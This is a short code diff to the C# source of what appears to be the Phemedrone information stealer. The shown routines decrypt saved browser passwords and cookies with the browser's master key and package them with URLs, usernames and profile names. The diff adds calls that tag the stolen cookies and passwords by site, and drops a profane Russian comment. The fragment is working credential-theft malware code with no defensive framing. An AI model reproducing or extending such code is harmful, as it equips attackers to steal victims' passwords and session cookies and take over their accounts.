@@ -56,6 +56,7 @@ namespace Phemedrone.Services
                                 var expires = (ulong)row(7);
                                 var name = Encoding.UTF8.GetString((byte[])row(3));
                                 var value = AesGcm.DecryptValue((byte[])row(5), masterKey);
+                                BrowserHelpers.CookiesTags(hostname);
                                 if (value.Length < 1) return null;
                                 
                                 return BrowserHelpers.FormatCookie(hostname, httpOnly, path, secure,
@@ -80,12 +81,11 @@ namespace Phemedrone.Services
                                 var url = Encoding.UTF8.GetString((byte[])row(0));
                                 var username = Encoding.UTF8.GetString((byte[])row(3));
                                 var password = AesGcm.DecryptValue((byte[])row(5), masterKey);
-                                
+                                BrowserHelpers.PasswordsTags(url);
                                 return BrowserHelpers.FormatPassword(url, username, password, browserName,
                                     browserVersion, profileName);
                             }));
-
-                        // suka kakoy ti eblan
+                        
                         array.AddRange(ParseExtensions(profileLocation, browserName, profileName));
 
 
